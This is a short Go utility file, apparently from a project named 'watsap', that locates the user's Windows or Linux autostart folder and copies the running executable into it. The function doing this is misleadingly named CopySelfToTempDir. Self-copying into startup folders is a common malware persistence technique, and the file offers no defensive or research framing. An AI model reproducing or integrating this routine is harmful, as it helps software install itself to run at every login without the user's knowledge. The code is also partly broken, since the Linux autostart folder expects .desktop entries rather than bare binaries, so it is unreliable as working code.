package utils

import (
	"io"
	"os"
	"path/filepath"
	"runtime"

	"watsap/utils/config"
)

// GetAutostartPath returns the autostart directory path based on the operating system.
func GetAutostartPath() string {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(homeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	case "linux":
		return filepath.Join(homeDir, ".config", "autostart")
	default:
		return ""
	}
}

// CopySelfToTempDir copies the current executable to the autostart directory and sets executable permissions.
func CopySelfToTempDir() error {
	config.Logger("Starting CopySelfToTempDir", "debug")
	// Get the path of the current executable
	exePath, err := os.Executable()
	if err != nil {
		config.Logger("Error getting executable path: "+err.Error(), "error")
		return err
	}
	config.Logger("Executable path: "+exePath, "debug")

	// Create the destination path
	dstPath := filepath.Join(GetAutostartPath(), filepath.Base(exePath))
	config.Logger("Destination path: "+dstPath, "debug")

	// Open the source file
	srcFile, err := os.Open(exePath)
	if err != nil {
		config.Logger("Error opening source file: "+err.Error(), "error")
		return err
	}
	defer srcFile.Close()

	// Create the destination file
	dstFile, err := os.Create(dstPath)
	if err != nil {
		config.Logger("Error creating destination file: "+err.Error(), "error")
		return err
	}
	defer dstFile.Close()

	// Copy the file contents
	if _, err := io.Copy(dstFile, srcFile); err != nil {
		config.Logger("Error copying file contents: "+err.Error(), "error")
		return err
	}

	// Set the executable permissions (only for Unix-like systems)
	if runtime.GOOS != "windows" {
		if err := dstFile.Chmod(0755); err != nil {
			config.Logger("Error setting executable permissions: "+err.Error(), "error")
			return err
		}
	}

	config.Logger("File copied to autostart directory successfully", "debug")
	return nil
}
